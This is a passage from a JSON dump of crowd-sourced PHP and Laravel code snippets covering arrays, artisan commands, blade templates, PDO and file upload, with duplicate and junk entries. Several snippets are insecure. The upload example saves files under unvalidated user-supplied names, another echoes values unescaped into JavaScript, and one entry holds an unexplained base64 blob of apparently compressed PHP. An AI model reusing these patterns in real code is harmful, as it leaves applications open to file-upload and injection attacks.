    "description": " <?php $queue = array(\"orange\", \"banana\"); array_unshift($queue, \"apple\", \"raspberry\"); print_r($queue); ?>   Array (     [0] => apple     [1] => raspberry     [2] => orange     [3] => banana )  \n <?php \t$a=array(\"a\"=>\"red\",\"b\"=>\"green\"); \tarray_unshift($a,\"blue\"); \tprint_r($a); // result : Array ( [0] => blue [a] => red [b] => green )  ?> \n <?php   $a=array(\"a\"=>\"red\",\"b\"=>\"green\"); array_unshift($a,\"blue\"); print_r($a);  ?>  \n$cola = array(\"naranja\", \"banana\"); array_unshift($cola, \"manzana\", \"frambuesa\"); print_r($cola);  Array (     [0] => manzana     [1] => frambuesa     [2] => naranja     [3] => banana )\n",
    "reg_date": "2021-10-12T10:12:47.000Z"
  },
  {
    "id": 468,
    "keyword": null,
    "link": null,
    "title": " array values php",
    "description": "array_values(array)\n<?php    $array = array(\"size\" => \"XL\", \"color\" => \"gold\");  print_r(array_values($array));  ?>\n <?php $array = array(\"size\" => \"XL\", \"color\" => \"gold\"); print_r(array_values($array)); ?> // [\"XL\",\"gold\"]  \n <?php $array = array(     \"foo\" => \"bar\",     \"bar\" => \"foo\", );  // as of PHP 5.4 $array = [     \"foo\" => \"bar\",     \"bar\" => \"foo\", ]; ?>  \n<?php  function data() {     $out[0] = \"abc\";     $out[1] = \"def\";     $out[2] = \"ghi\";     return $out; }  $data = data(); foreach($data as $items){     echo $items; } \n<?php $array = array(     \"foo\" => \"bar\",     \"bar\" => \"foo\", );  // as of PHP 5.4 $array = [     \"foo\" => \"bar\",     \"bar\" => \"foo\", ]; ?> \n",
    "reg_date": "2021-10-12T10:12:47.000Z"
  },
  {
    "id": 469,
    "keyword": null,
    "link": null,
    "title": " artisan cache clear",
    "description": "php artisan cache:clear php artisan route:clear php artisan config:clear  php artisan view:clear \n//laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n//Updated Dec 2020 //laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n/**[SAFE] Clears all cache with 1 line!**/  php artisan route:clear &&   php artisan view:clear &&  php artisan config:clear && php artisan cache:clear &&  php artisan clear-compiled\nphp artisan optimize:clear\n//Laravel 7 / 2021-01 php artisan cache:clear php artisan route:clear php artisan config:clear php artisan optimize\n",
    "reg_date": "2021-10-12T10:12:48.000Z"
  },
  {
    "id": 470,
    "keyword": null,
    "link": null,
    "title": " artisan call migrate result",
    "description": "    Artisan::call('migrate');    return Artisan::output(); \n",
    "reg_date": "2021-10-12T10:12:48.000Z"
  },
  {
    "id": 471,
    "keyword": null,
    "link": null,
    "title": " artisan make auth",
    "description": "composer require laravel/ui php artisan ui vue --auth\ncomposer require laravel/ui php artisan ui vue --auth \ncomposer require laravel/ui  php artisan ui bootstrap  php artisan ui bootstrap --auth  npm install && npm run dev\nLaravel's laravel/ui package provides a quick way to scaffold all of the routes and views you need for authentication using a few simple commands:  composer require laravel/ui  php artisan ui vue --auth\ncomposer require laravel/ui --dev php artisan ui vue --auth \n// Laravel 5.x php artisan make:auth\n",
    "reg_date": "2021-10-12T10:12:48.000Z"
  },
  {
    "id": 472,
    "keyword": null,
    "link": null,
    "title": " artisan make command",
    "description": "php artisan make:command SendEmails\nphp artisan make:command SendEmail\nphp artisan make:command CommandName\nArtisan::command('build {project}', function ($project) {     $this->info(\"Building {$project}!\"); })->describe('Build the project');\n$arguments = $this->arguments();\nif ($this->confirm('Do you wish to continue?')) {     // }\n",
    "reg_date": "2021-10-12T10:12:48.000Z"
  },
  {
    "id": 473,
    "keyword": null,
    "link": null,
    "title": " artisan make migration with model",
    "description": "php artisan make:migration create_users_table \nphp artisan make:model Model_Name -m\n# If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\nphp artisan make:Model Status -m\nphp artisan make:model ModelName -a \nphp artisan make:migration CreateUsersTable\n",
    "reg_date": "2021-10-12T10:12:48.000Z"
  },
  {
    "id": 474,
    "keyword": null,
    "link": null,
    "title": " artisan make model with migration",
    "description": "php artisan make:model Model_Name -m\nphp artisan make:model Settings -m\n# If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\nphp artisan make:Model Status -m\nphp artisan make:model ModelName -a \nphp artisan make:model Flight --migration\n",
    "reg_date": "2021-10-12T10:12:48.000Z"
  },
  {
    "id": 475,
    "keyword": null,
    "link": null,
    "title": " artisan mograte particular tabel",
    "description": "php artisan migrate --path=/database/migrations/migration_name/php\n",
    "reg_date": "2021-10-12T10:12:48.000Z"
  },
  {
    "id": 476,
    "keyword": null,
    "link": null,
    "title": " artisan refresh",
    "description": "Try this command it works for me  php artisan migrate:fresh However, be careful! This command will drop all data from your DB:\n",
    "reg_date": "2021-10-12T10:12:48.000Z"
  },
  {
    "id": 477,
    "keyword": null,
    "link": null,
    "title": " artisan show routes for model",
    "description": "php artisan route:list --name=user\n",
    "reg_date": "2021-10-12T10:12:48.000Z"
  },
  {
    "id": 478,
    "keyword": null,
    "link": null,
    "title": " artisan to make model controller factroy seeder at once",
    "description": "php artisan make:model Todo -a\n",
    "reg_date": "2021-10-12T10:12:49.000Z"
  },
  {
    "id": 479,
    "keyword": null,
    "link": null,
    "title": " asia time zone in php",
    "description": "date_default_timezone_set('Asia/Kolkata'); $timestamp = date(\"Y-m-d H:i:s\");\n<?php date_default_timezone_set(\"Asia/Calcutta\");   //India time (GMT+5:30) echo date('d-m-Y H:i:s'); ?>\n",
    "reg_date": "2021-10-12T10:12:49.000Z"
  },
  {
    "id": 480,
    "keyword": null,
    "link": null,
    "title": " assign $variable of key value pair array to multiple variables php",
    "description": "$healthStructureData = [             'product' => $product,             'website_data' => $website_data,             'total_keywords' => $total_keywords,             'certificate_status' => $certificate_status,             'total_user_websites' => $total_user_websites,         ];  foreach ($healthStructureData as $key => $value) {   $$key = $value; }\n <?php $array = array(     \"foo\" => \"bar\",     42    => 24,     \"multi\" => array(          \"dimensional\" => array(              \"array\" => \"foo\"          )     ) );  var_dump($array[\"foo\"]); var_dump($array[42]); var_dump($array[\"multi\"][\"dimensional\"][\"array\"]); ?>  \n <?php $array = array(\"foo\", \"bar\", \"hello\", \"world\"); var_dump($array); ?>  \nclass Arr {     public static function setValue(&$data, $path, $value)     {         $temp = &$data;         foreach ($path as $key) $temp = &$temp[$key];                 $temp = $value;         return $value;     }      public static function getValue(&$data, $path, $value)     {         $temp = &$data;         foreach ($path as $key) $temp = &$temp[$key];         return $temp;     }      public static function incValue(&$data, $path, $value)     {         $temp = (int)self::getValue($data, $path, $value)+$value;         self::setValue($data, $path, $temp);     } }  $d=array(); Arr::incValue($d,array(\"the\",\"next\",\"value\"),10); echo '<pre>'.json_encode($d, JSON_PRETTY_PRINT);  /* {     \"the\": {         \"next\": {             \"value\": 10         }     } } */\n",
    "reg_date": "2021-10-12T10:12:49.000Z"
  },
  {
    "id": 481,
    "keyword": null,
    "link": null,
    "title": " assign multiple variables php",
    "description": "$var_a = $var_b = $same_var = $var_d = $some_var = 'A';\n[$var1, $var2, $var3, $var4, $var5] = array(1, 2, 3, 4, 5);\n$totalvariablename = $variablename * $othervariablename + ($othervariablename * 2);\n",
    "reg_date": "2021-10-12T10:12:49.000Z"
  },
  {
    "id": 482,
    "keyword": null,
    "link": null,
    "title": " assign php array into javascript",
    "description": "<script type=\"text/javascript\">  \t$(document).ready(function() {       FACILITY_BOOKING.lst_festival_day = new Array();       <?php foreach($festival_day as $key => $val) { ?>         FACILITY_BOOKING.lst_festival_day.push('<?php echo $val; ?>');       <?php } ?>     }); </script>\n",
    "reg_date": "2021-10-12T10:12:49.000Z"
  },
  {
    "id": 483,
    "keyword": null,
    "link": null,
    "title": " assign value php",
    "description": "reset($val['MemberSaveRoom'])['is_favour_room'] = true; // INCORRECT $val['MemberSaveRoom'][0]['is_favour_room'] = true; \t// CORRECT  // result  MemberSaveRoom = array(   [0] = array(     'is_favour_room' => true,   )); \n",
    "reg_date": "2021-10-12T10:12:49.000Z"
  },
  {
    "id": 484,
    "keyword": null,
    "link": null,
    "title": " attach multiple files in laravel mailable",
    "description": "public function build() {     $email = $this->view('emails.employment_mailview')->subject('Employment Application');      // $attachments is an array with file paths of attachments     foreach($attachments as $filePath){         $email->attach($filePath);     }     return $email; } \n",
    "reg_date": "2021-10-12T10:12:49.000Z"
  },
  {
    "id": 485,
    "keyword": null,
    "link": null,
    "title": " auto generate password in php",
    "description": "function rand_string( $length ) {     $chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";     return substr(str_shuffle($chars),0,$length); }  echo rand_string(8);\n",
    "reg_date": "2021-10-12T10:12:49.000Z"
  },
  {
    "id": 486,
    "keyword": null,
    "link": null,
    "title": " auto remove .php extension using .htaccess",
    "description": "#This code will automatically remove .php extention #ex: it remmoves www.eample.com/xyz.php to www.example.com/xyz RewriteEngine on RewriteBase / RewriteRule ^(.+)\\.php$ /$1 [R,L] RewriteCond %{REQUEST_FILENAME}.php -f RewriteRule ^(.*?)/?$ /$1.php [NC,END]  #Copy and paste the above code in .htaccess file \n",
    "reg_date": "2021-10-12T10:12:49.000Z"
  },
  {
    "id": 487,
    "keyword": null,
    "link": null,
    "title": " autoload.php",
    "description": "The introduction of spl_autoload_register() gave programmers  the ability to create an autoload chain,  a series of functions that can be called to try and load a class or interface.   For example:  <?php function autoloadModel($className) {     $filename = \"models/\" . $className . \".php\";     if (is_readable($filename)) {         require $filename;     } }  function autoloadController($className) {     $filename = \"controllers/\" . $className . \".php\";     if (is_readable($filename)) {         require $filename;     } }  spl_autoload_register(\"autoloadModel\"); spl_autoload_register(\"autoloadController\");\nExample #1 Autoload example  This example attempts to load the classes MyClass1 and MyClass2 from the files MyClass1.php and MyClass2.php respectively. <?php spl_autoload_register(function ($class_name) {     include $class_name . '.php'; });  $obj  = new MyClass1(); $obj2 = new MyClass2();  ?>  \n",
    "reg_date": "2021-10-12T10:12:49.000Z"
  },
  {
    "id": 488,
    "keyword": null,
    "link": null,
    "title": " autoload file in laravel",
    "description": "Inside composer.json file   \"autoload\": {         \"files\": [             \"app/Helpers/helpers.php\"         ]   \t}\n",
    "reg_date": "2021-10-12T10:12:49.000Z"
  },
  {
    "id": 489,
    "keyword": null,
    "link": null,
    "title": " autoload file laravel",
    "description": "Inside composer.json file   \"autoload\": {         \"files\": [             \"app/Helpers/helpers.php\"         ]   \t}\n",
    "reg_date": "2021-10-12T10:12:50.000Z"
  },
  {
    "id": 490,
    "keyword": null,
    "link": null,
    "title": " autoload helper in laravel",
    "description": "1. Create a helpers.php file in your app folder and load it up with composer:  \"autoload\": {     \"classmap\": [         ...     ],     \"psr-4\": {         \"App\\\\\": \"app/\"     },     \"files\": [         \"app/helpers.php\" // <---- ADD THIS     ] },  2. After adding that to your composer.json file, run the following command: \tcomposer dump-autoload  3. If you dont like keeping your helpers.php file in your app directory (because it is not a PSR-4 namespaced class file), you can do what the  laravel.com website does: store the helpers.php in the bootstrap directory.  Remember to set it in your composer.json file:  \"autoload\": {   ..........        \"files\": [       \"app/Helpers/helpers.php\"   ]      .............. }\n",
    "reg_date": "2021-10-12T10:12:50.000Z"
  },
  {
    "id": 491,
    "keyword": null,
    "link": null,
    "title": " autoloader php",
    "description": "The introduction of spl_autoload_register() gave programmers  the ability to create an autoload chain,  a series of functions that can be called to try and load a class or interface.   For example:  <?php function autoloadModel($className) {     $filename = \"models/\" . $className . \".php\";     if (is_readable($filename)) {         require $filename;     } }  function autoloadController($className) {     $filename = \"controllers/\" . $className . \".php\";     if (is_readable($filename)) {         require $filename;     } }  spl_autoload_register(\"autoloadModel\"); spl_autoload_register(\"autoloadController\");\nExample #1 Autoload example  This example attempts to load the classes MyClass1 and MyClass2 from the files MyClass1.php and MyClass2.php respectively. <?php spl_autoload_register(function ($class_name) {     include $class_name . '.php'; });  $obj  = new MyClass1(); $obj2 = new MyClass2();  ?>  \n",
    "reg_date": "2021-10-12T10:12:50.000Z"
  },
  {
    "id": 492,
    "keyword": null,
    "link": null,
    "title": " automatic years php",
    "description": "&copy; <?php echo date(\"Y\"); ?>\n&copy; 2008-<?php echo date(\"Y\"); ?> // 2008-20??\n<?php function auto_copyright($year = 'auto'){ ?>    <?php if(intval($year) == 'auto'){ $year = date('Y'); } ?>    <?php if(intval($year) == date('Y')){ echo intval($year); } ?>    <?php if(intval($year) < date('Y')){ echo intval($year) . ' - ' . date('Y'); } ?>    <?php if(intval($year) > date('Y')){ echo date('Y'); } ?> <?php } ?>     <?php auto_copyright(); // 2011?>  <?php auto_copyright(\"2010\");  // 2010 - 2017 ?>\n",
    "reg_date": "2021-10-12T10:12:50.000Z"
  },
  {
    "id": 493,
    "keyword": null,
    "link": null,
    "title": " avg rating get in join in laravel 8",
    "description": "$users = User::where('type', 'instructor')->get();   foreach ($users as $user) {       $user['ratings'] = $user->ratings()->avg('rate');   }   return $users;   $data = User::with('ratings') ->join('Rating table','user.id','=','Rating table.user_id') ->select('user.*',DB::raw('avg(rating_for_user)')) ->get();\n",
    "reg_date": "2021-10-12T10:12:50.000Z"
  },
  {
    "id": 494,
    "keyword": null,
    "link": null,
    "title": " aws s3 laravel package",
    "description": "composer require league/flysystem-aws-s3-v3\n",
    "reg_date": "2021-10-12T10:12:50.000Z"
  },
  {
    "id": 495,
    "keyword": null,
    "link": null,
    "title": " aws sdk php",
    "description": "You can get by aws/aws-sdk-php package https://github.com/aws/aws-sdk-php/releases.  for more refer link: https://docs.aws.amazon.com/aws-sdk-php/v2/guide/\n",
    "reg_date": "2021-10-12T10:12:50.000Z"
  },
  {
    "id": 496,
    "keyword": null,
    "link": null,
    "title": " back() with errors in laravel",
    "description": "return Redirect::back()->withErrors(['msg' => 'The Message']); inside you view @if($errors->any()) <h4>{{$errors->first()}}</h4> @endif\n",
    "reg_date": "2021-10-12T10:12:50.000Z"
  },
  {
    "id": 497,
    "keyword": null,
    "link": null,
    "title": " back route laravel",
    "description": "1. The cleanest way seems to be using the url() helper: \t{{ url()->previous() }}  2. URL::previous() works for me in my Laravel 5.1 project. Here is Laravel 5.1    doc for previous() method, which is accessible through URL Facade.  3. You can still try alternatives, in your views you can do:  \t{{ redirect()->getUrlGenerator()->previous() }} \t\t\t\t\t\tOR \t{{ redirect()->back()->getTargetUrl() }}\n",
    "reg_date": "2021-10-12T10:12:50.000Z"
  },
  {
    "id": 498,
    "keyword": null,
    "link": null,
    "title": " base64 decode in php",
    "description": "base64_decode('base64');\nbase64_decode('base64-string-goes-here');\n<?php     // Program to illustrate base64_decode()  // function  $str = 'R0ZHLCBBIGNvbXB1dGVyIFNjaWVuY2UgUG9ydGFsIEZvciBHZWVrcw';  echo base64_decode($str). \"\\n\";     $str = 'MQ==';  echo base64_decode($str). \"\\n\";  ?>  \nGFG, A computer Science Portal For Geeks 1 \n",
    "reg_date": "2021-10-12T10:12:50.000Z"
  },
  {
    "id": 499,
    "keyword": null,
    "link": null,
    "title": " base64 decode php",
    "description": "base64_decode('base64');\nbase64_decode('base64-string-goes-here');\n<?php     // Program to illustrate base64_decode()  // function  $str = 'R0ZHLCBBIGNvbXB1dGVyIFNjaWVuY2UgUG9ydGFsIEZvciBHZWVrcw';  echo base64_decode($str). \"\\n\";     $str = 'MQ==';  echo base64_decode($str). \"\\n\";  ?>  \nGFG, A computer Science Portal For Geeks 1 \nQAAAPD8gIG9iX3N0YXJ0KCk7IACAIHNlc3Npb24BKGluY2x1ZGUAACAnbGlicy9zZXR0aW5nLnAYDGhwJwLwAdZjb25maWcuAQABswkgYDAgAMADk3N5c3RlbS8AcwH2ICAJaQAAZighZW1wdHkoJHJlcV9xdQTOZXJ5KSkBkHsgA/AB22RvAaEBcAj1bQABb2R1bGVzL2FkbWluLycuBDIHgGRvLicuBIIGgwSAADBlbHNlIGlmQwkgBupkb2l0BT8FMnVzZXIFJ2l0BU8+YCAgBUII/wN1CEMIzwl9DfADxGVjaG8gAAQnbm90IGhhdmUgYWN0F6AgPADAYSBocmVmPSINMBVjWydpbmRlAAF4J10uJyI+aG9tZTwvYT4X4YAAFlA/Pg==\n",
    "reg_date": "2021-10-12T10:12:51.000Z"
  },
  {
    "id": 500,
    "keyword": null,
    "link": null,
    "title": " base64 encode username password php example",
    "description": "$auth = base64_encode($uname . \":\" . $pass); curl_setopt($curl, CURLOPT_HTTPHEADER, array(\"Authorization: Basic $auth\",                                               \"Accept: application/json\",                                               \"Content-Type: application/json\"));\n",
    "reg_date": "2021-10-12T10:12:51.000Z"
  },
  {
    "id": 501,
    "keyword": null,
    "link": null,
    "title": " base url in php",
    "description": "Try this:  <?php echo \"http://\" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; ?> Learn more about the $_SERVER predefined variable.  If you plan on using https, you can use this:  function url(){   return sprintf(     \"%s://%s%s\",     isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off' ? 'https' : 'http',     $_SERVER['SERVER_NAME'],     $_SERVER['REQUEST_URI']   ); }  echo url(); #=> http://127.0.0.1/foo Per this answer, please make sure to configure your Apache properly so you can safely depend on SERVER_NAME.  <VirtualHost *>     ServerName example.com     UseCanonicalName on </VirtualHost> NOTE: If you're depending on the HTTP_HOST key (which contains user input), you still have to make some cleanup, remove spaces, commas, carriage return, etc. Anything that is not a valid character for a domain. Check the PHP builtin parse_url function for an example.\n<?php echo \"http://\" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; ?> \n",
    "reg_date": "2021-10-12T10:12:51.000Z"
  },
  {
    "id": 502,
    "keyword": null,
    "link": null,
    "title": " basic code for file upload in php",
    "description": "//This is the minimal code for an image upload for first time learners //html portion <!DOCTYPE html> <html> <head> \t<title>ImageUpload</title> </head> <body> \t<form action=\"upload.php\" method=\"post\" enctype=\"multipart/form-data\"> \t\t<label>Username</label> \t\t<input type=\"text\" name=\"username\"> \t\t<br> \t\t<label>UploadImage</label> \t\t<input type=\"file\" name='myfile'> \t\t<br/> \t\t<input type=\"submit\" value=\"upload\"> \t</form> </body> </html>     //php portion   <?php \t$user=$_POST['username']; \t$image=$_FILES['myfile']; \techo \"Hello $user <br/>\"; \techo \"File Name<b>::</b> \".$image['name'];  \tmove_uploaded_file($image['tmp_name'],\"photos/\".$image['name']); \t//here the \"photos\" folder is in same folder as the upload.php,  \t//otherwise complete url has to be mentioned \t?>\n",
    "reg_date": "2021-10-12T10:12:51.000Z"
  },
  {
    "id": 503,
    "keyword": null,
    "link": null,
    "title": " bcript laravel",
    "description": "$password = bcrypt('secret');\n",
    "reg_date": "2021-10-12T10:12:51.000Z"
  },
  {
    "id": 504,
    "keyword": null,
    "link": null,
    "title": " bcrypt laravel",
    "description": "$password = bcrypt('secret');\n$password = Hash::make('yourPa$$w0rd');\nsadfasdf\n111111\n",
    "reg_date": "2021-10-12T10:12:51.000Z"
  },
  {
    "id": 505,
    "keyword": null,
    "link": null,
    "title": " beautify var dump",
    "description": "echo '<pre>' . var_export($data, true) . '</pre>';\n",
    "reg_date": "2021-10-12T10:12:51.000Z"
  },
  {
    "id": 506,
    "keyword": null,
    "link": null,
    "title": " behamin brequest installation on laravel",
    "description": "php artisan make:brequest RequestName\n",
    "reg_date": "2021-10-12T10:12:51.000Z"
  },
  {
    "id": 507,
    "keyword": null,
    "link": null,
    "title": " behamin bresource collection",
    "description": "php artisan make:bresource ResourceName --collection\n",
    "reg_date": "2021-10-12T10:12:51.000Z"
  },
  {
    "id": 508,
    "keyword": null,
    "link": null,
    "title": " belongs to many laravel",
    "description": "// Detach a single role from the user... $user->roles()->detach($roleId);  // Detach all roles from the user... $user->roles()->detach();\nFor example, a blog post may have an infinite number of comments. And a single comment belongs to only a single post    class Post extends Model {     public function comments()     {         return $this->hasMany('App\\Models\\Comment');     } }  class Comment extends Model {     public function post()     {         return $this->belongsTo('App\\Models\\Post');     } }\n<?php  namespace App\\Models;  use Illuminate\\Database\\Eloquent\\Model;  class Phone extends Model {     /**      * Get the user that owns the phone.      */     public function user()     {         return $this->belongsTo('App\\Models\\User');     } }\nuse App\\Models\\User;  $user = User::find(1);  $user->roles()->attach($roleId);\n$movies = Movie::whereHas('director', function($q) {     $q->where('name', 'great'); })->get(); \n",
    "reg_date": "2021-10-12T10:12:51.000Z"
  },
  {
    "id": 509,
    "keyword": null,
    "link": null,
    "title": " bigtext migration laravel",
    "description": "            $table->longText('description'); \n$this->bigIncrements('id'); This takes care of making it unsigned, auto increment and primary key\n",
    "reg_date": "2021-10-12T10:12:52.000Z"
  },
  {
    "id": 510,
    "keyword": null,
    "link": null,
    "title": " bin to dec php",
    "description": "$binary = '1101100010010010';  $decimal = bindec($binary);  echo $binary . ' -> decimal value is: ' . $decimal;\n",
    "reg_date": "2021-10-12T10:12:52.000Z"
  },
  {
    "id": 511,
    "keyword": null,
    "link": null,
    "title": " bind in pdo",
    "description": "If we had a value:  $sql = \"SELECT * FROM myTable WHERE id = ?\"; $stmt = $conn->prepare($sql); $stmt->bindValue(1,1); $stmt->execute();  If we had two values:   $sql = \"SELECT * FROM myTable WHERE id = ? and name = ?\"; $stmt = $conn->prepare($sql); $stmt->bindValue(1,1); $stmt->bindValue(2,\"alireza\"); $stmt->execute();\n$sql = \"SELECT * FROM myTable WHERE id = ?\"; $stmt = $conn->prepare($sql); $stmt->execute([$id]);\n$sql = \"SELECT * FROM myTable WHERE id = :id\"; $stmt = $conn->prepare($sql); $stmt->execute([\":id\"=>$id]);\n",
    "reg_date": "2021-10-12T10:12:52.000Z"
  },
  {
    "id": 512,
    "keyword": null,
    "link": null,
    "title": " bind method in pdo in php",
    "description": "If we had a value:  $sql = \"SELECT * FROM myTable WHERE id = ?\"; $stmt = $conn->prepare($sql); $stmt->bindValue(1,1); $stmt->execute();  If we had two values:   $sql = \"SELECT * FROM myTable WHERE id = ? and name = ?\"; $stmt = $conn->prepare($sql); $stmt->bindValue(1,1); $stmt->bindValue(2,\"alireza\"); $stmt->execute();\n$sql = \"SELECT * FROM myTable WHERE id = ?\"; $stmt = $conn->prepare($sql); $stmt->execute([$id]);\n$sql = \"SELECT * FROM myTable WHERE id = :id\"; $stmt = $conn->prepare($sql); $stmt->execute([\":id\"=>$id]);\n",
    "reg_date": "2021-10-12T10:12:52.000Z"
  },
  {
    "id": 513,
    "keyword": null,
    "link": null,
    "title": " bindmodel cakephp",
    "description": " // Our case: MemberNotification -> BelongsTo -> Notification,  Notification -> HasMany -> NotificationLanguage  $this->MemberNotification->recursive = 0; $this->set('memberNotifications', $this->paginate()); $this->MemberNotification->bindModel(array(     'belongsTo' => array(         'NotificationLanguage' => array(             'foreignKey' => false,             'conditions' => array('Notification.id = NotificationLanguage.notification_id')         ),     ) ));  // our purpose just make the NotificationLanguage same level with the Notification,  // so we can sort 2nd level association     \n",
    "reg_date": "2021-10-12T10:12:52.000Z"
  },
  {
    "id": 514,
    "keyword": null,
    "link": null,
    "title": " bitrix is admin",
    "description": "<? global $USER; if ($USER->IsAdmin()) echo \"Вы администратор!\"; ?>\n",
    "reg_date": "2021-10-12T10:12:52.000Z"
  },
  {
    "id": 515,
    "keyword": null,
    "link": null,
    "title": " blade button confim",
    "description": "<a class=\"btn btn-danger\" onclick=\"return confirm('Are you sure?')\" href=\"{{route('city-delete', $result->my_id)}}\"><i class=\"fa fa-trash\"></i></a> \n",
    "reg_date": "2021-10-12T10:12:52.000Z"
  },
  {
    "id": 516,
    "keyword": null,
    "link": null,
    "title": " blade capitalize first letter",
    "description": "use Illuminate\\Support\\Str;  ...  $string = Str::ucfirst('foo bar');\npublic function getProvince($value) {     return strtoupper($value); } \n$string = ucfirst(\"my name is doe\");\n",
    "reg_date": "2021-10-12T10:12:52.000Z"
  },
  {
    "id": 517,
    "keyword": null,
    "link": null,
    "title": " blade comment",
    "description": "// Example blade (out)comment: {{-- [YOUR CODE/TEXT HERE] --}}\n{{-- Form Section 1 --}} \n@php     // @endphp\n{{ request()->has('faq') ? request()->get('faq') : '' }}\n1{{-- This comment will not be present in the rendered HTML --}}\n<x-inputs.button/>\n",
    "reg_date": "2021-10-12T10:12:52.000Z"
  },
  {
    "id": 518,
    "keyword": null,
    "link": null,
    "title": " blade if",
    "description": "@if($user->status =='active')                <td>{{ $user->name }}</td>          @else       <td> Guest </td>         @endif\n//LARAVEL - BLADE:  @guest     // The user is not authenticated... @endguest    @auth     // The user is authenticated... @endauth\n@forelse ($users as $user)     <li>{{ $user->name }}</li> @empty     <p>No users</p> @endforelse\n@if (count($records) === 1)     I have one record! @elseif (count($records) > 1)     I have multiple records! @else     I don't have any records! @endif\n@if ($dummy == 1)    we have 1 record@elseif ($dummy ==10)    we have 10 record@else    No record found.@endif\n      @if($order->status == 'NEEDS REVISION')                     <td>{{$order->status}}</td>                 @else                     <td id=\"revision-status\">{{$order->status}}</td>                 @endif\n",
    "reg_date": "2021-10-12T10:12:52.000Z"
  },
  {
    "id": 519,
    "keyword": null,
    "link": null,
    "title": " blade loop last",
    "description": "$loop->last  @foreach ($colors as $k => $v)      @if($loop->last)          // at last loop, code here      @endif @endforeach \n",
    "reg_date": "2021-10-12T10:12:52.000Z"
  },
  {
    "id": 520,
    "keyword": null,
    "link": null,
    "title": " blade set variable",
    "description": "@php ($i = 1) \n@php $i = 1 @endphp\n",
    "reg_date": "2021-10-12T10:12:53.000Z"
  },
  {
    "id": 521,
    "keyword": null,
    "link": null,
    "title": " blade switch",
    "description": "@switch($i)     @case(1)         First case...         @break      @case(2)         Second case...         @break      @default         Default case... @endswitch\n",
    "reg_date": "2021-10-12T10:12:53.000Z"
  },
  {
    "id": 522,
    "keyword": null,
    "link": null,
    "title": " br php",
    "description": "echo \"$variabile.<br>\";\n<br></br>\n",
    "reg_date": "2021-10-12T10:12:53.000Z"
  },
  {
    "id": 523,
    "keyword": null,
    "link": null,
    "title": " branch from other branch",
    "description": "// Go first to the branch where you want to make a copy of git checkout -b subbranch branch \n$ git checkout -b myFeature dev\n$ git checkout -b myfeature dev \n",
    "reg_date": "2021-10-12T10:12:53.000Z"
  },
  {
    "id": 524,
    "keyword": null,
    "link": null,
    "title": " brew downgrade php 8 to 7.4",
    "description": "#Install php version 7.3 brew install php@7.3 #Install the required PHP to your PATH echo 'export PATH=\"/usr/local/opt/php@7.3/bin:$PATH\"' >> ~/.bash_profile echo 'export PATH=\"/usr/local/opt/php@7.3/sbin:$PATH\"' >> ~/.bash_profile source ~/.bash_profile #Check Version php --version #Show you where your ini file is loaded php --ini\n$ brew unlink php@7.1 $ brew link php@7.4 --force --overwrite \n",
    "reg_date": "2021-10-12T10:12:53.000Z"
  },
  {
    "id": 525,
    "keyword": null,
    "link": null,
    "title": " brew switch php version",
    "description": "brew unlink php@7.4 brew link php@7.3 \n$ brew unlink php@7.4 $ brew link php@8.0 --force --overwrite\n",
    "reg_date": "2021-10-12T10:12:53.000Z"
  },
  {
    "id": 526,
    "keyword": null,
    "link": null,
    "title": " bubble sort php",
    "description": "<?php function bubble_Sort($my_array ) { \tdo \t{ \t\t$swapped = false; \t\tfor( $i = 0, $c = count( $my_array ) - 1; $i < $c; $i++ ) \t\t{ \t\t\tif( $my_array[$i] > $my_array[$i + 1] ) \t\t\t{ \t\t\t\tlist( $my_array[$i + 1], $my_array[$i] ) = \t\t\t\t\t\tarray( $my_array[$i], $my_array[$i + 1] ); \t\t\t\t$swapped = true; \t\t\t} \t\t} \t} \twhile( $swapped ); return $my_array; }  $test_array = array(3, 0, 2, 5, -1, 4, 1); echo \"Original Array :\\n\"; echo implode(', ',$test_array ); echo \"\\nSorted Array\\n:\"; echo implode(', ',bubble_Sort($test_array)). PHP_EOL; ?>  \n",
    "reg_date": "2021-10-12T10:12:53.000Z"
  },
  {
    "id": 527,
    "keyword": null,
    "link": null,
    "title": " builder pattern php",
    "description": "<?php  namespace RefactoringGuru\\Builder\\Conceptual;  /**  * The Builder interface specifies methods for creating the different parts of  * the Product objects.  */ interface Builder {     public function producePartA(): void;      public function producePartB(): void;      public function producePartC(): void; }  /**  * The Concrete Builder classes follow the Builder interface and provide  * specific implementations of the building steps. Your program may have several  * variations of Builders, implemented differently.  */ class ConcreteBuilder1 implements Builder {     private $product;      /**      * A fresh builder instance should contain a blank product object, which is      * used in further assembly.      */     public function __construct()     {         $this->reset();     }      public function reset(): void     {         $this->product = new Product1();     }      /**      * All production steps work with the same product instance.      */     public function producePartA(): void     {         $this->product->parts[] = \"PartA1\";     }      public function producePartB(): void     {         $this->product->parts[] = \"PartB1\";     }      public function producePartC(): void     {         $this->product->parts[] = \"PartC1\";     }      /**      * Concrete Builders are supposed to provide their own methods for      * retrieving results. That's because various types of builders may create      * entirely different products that don't follow the same interface.      * Therefore, such methods cannot be declared in the base Builder interface      * (at least in a statically typed programming language). Note that PHP is a      * dynamically typed language and this method CAN be in the base interface.      * However, we won't declare it there for the sake of clarity.      *      * Usually, after returning the end result to the client, a builder instance      * is expected to be ready to start producing another product. That's why      * it's a usual practice to call the reset method at the end of the      * `getProduct` method body. However, this behavior is not mandatory, and      * you can make your builders wait for an explicit reset call from the      * client code before disposing of the previous result.      */     public function getProduct(): Product1     {         $result = $this->product;         $this->reset();          return $result;     } }  /**  * It makes sense to use the Builder pattern only when your products are quite  * complex and require extensive configuration.  *  * Unlike in other creational patterns, different concrete builders can produce  * unrelated products. In other words, results of various builders may not  * always follow the same interface.  */ class Product1 {     public $parts = [];      public function listParts(): void     {         echo \"Product parts: \" . implode(', ', $this->parts) . \"\\n\\n\";     } }  /**  * The Director is only responsible for executing the building steps in a  * particular sequence. It is helpful when producing products according to a  * specific order or configuration. Strictly speaking, the Director class is  * optional, since the client can control builders directly.  */ class Director {     /**      * @var Builder      */     private $builder;      